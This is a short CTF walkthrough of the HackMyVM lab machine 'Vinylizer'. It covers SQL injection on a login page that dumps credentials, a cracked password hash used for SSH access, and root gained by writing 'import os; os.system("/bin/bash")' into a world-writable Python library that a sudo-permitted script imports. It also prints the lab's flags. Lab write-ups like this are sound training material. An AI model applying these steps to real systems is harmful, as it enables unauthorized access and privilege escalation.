# Vinylizer

2025.03.26 https://hackmyvm.eu/machines/machine.php?vm=Vinylizer

[video](https://www.bilibili.com/video/BV1XvoaYtEg5/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

http://192.168.5.39/login.php 登陆存在 sql 注入， vinyl_marketplace 中的 users 表中有登陆凭据：

```
+----+-----------+----------------------------------+----------------+
| 1  | shopadmin | 9432522ed1a8fca612b11c3980a031f6 | 0              |
| 2  | lana      | password123                      | 0              |
+----+-----------+----------------------------------+----------------+
```

在线 hash 匹配，找到 shopamdin 的明文密码 addicted2vinyl 可以用这个用户登陆 ssh。

拿到了 user flag:

```
shopadmin@vinylizer:~$ cat user.txt
I_L0V3_V1NYL5
```

sudo -l 显示 (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py

发现脚本中引用的一个库对全体用户有修改权限 /usr/lib/python3.10/random.py 直接将 `import os; os.system("/bin/bash")` 写入，然后再执行 sudo，拿到 root 权限。

```
root@vinylizer:~# cat root.txt
4UD10PH1L3
```
